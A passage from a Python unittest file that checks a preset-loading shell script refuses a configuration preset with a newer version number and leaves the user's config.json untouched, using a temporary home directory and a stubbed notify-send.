        self.assertFalse(verdict["ok"])
        self.assertEqual(verdict["status"], "too-new")


class TestApplyBackstop(unittest.TestCase):
    """presets.sh refuses a too-new preset before anything is written.

    Only the refusal is exercised: a successful load re-runs the colour
    pipeline against the live compositor, which a test has no business doing.
    """

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.home = os.path.join(self.tmp.name, "home")
        self.presets = os.path.join(self.home, ".config", "illogical-impulse", "presets")
        os.makedirs(self.presets)
        self.config = os.path.join(self.home, ".config", "illogical-impulse", "config.json")
        with open(self.config, "w", encoding="utf-8") as f:
            json.dump({"configVersion": 1, "bar": {"height": 40}}, f)
        # notify-send would put a real popup on the tester's screen.
        self.stubs = os.path.join(self.tmp.name, "stubs")
        os.makedirs(self.stubs)
        stub = os.path.join(self.stubs, "notify-send")
        with open(stub, "w", encoding="utf-8") as f:
            f.write("#!/bin/sh\nexit 0\n")
        os.chmod(stub, 0o755)

    def run_load(self, name):
        env = dict(os.environ)
        env["HOME"] = self.home
        env["PATH"] = self.stubs + os.pathsep + env.get("PATH", "")
        return subprocess.run(
            ["bash", os.path.join(SCRIPTS_DIR, "presets.sh"), "load", name],
            capture_output=True, text=True, env=env)

    def test_a_preset_from_the_future_is_not_applied(self):
        ours = presets_helper.current_config_version()
        with open(os.path.join(self.presets, "Future.json"), "w", encoding="utf-8") as f:
            json.dump({"configVersion": ours + 1, "bar": {"height": 99}}, f)
        before = open(self.config, encoding="utf-8").read()
        proc = self.run_load("Future")
        self.assertEqual(proc.returncode, 1)
        self.assertIn("newer version", proc.stderr)
        self.assertEqual(open(self.config, encoding="utf-8").read(), before)


if __name__ == "__main__":
    unittest.main()

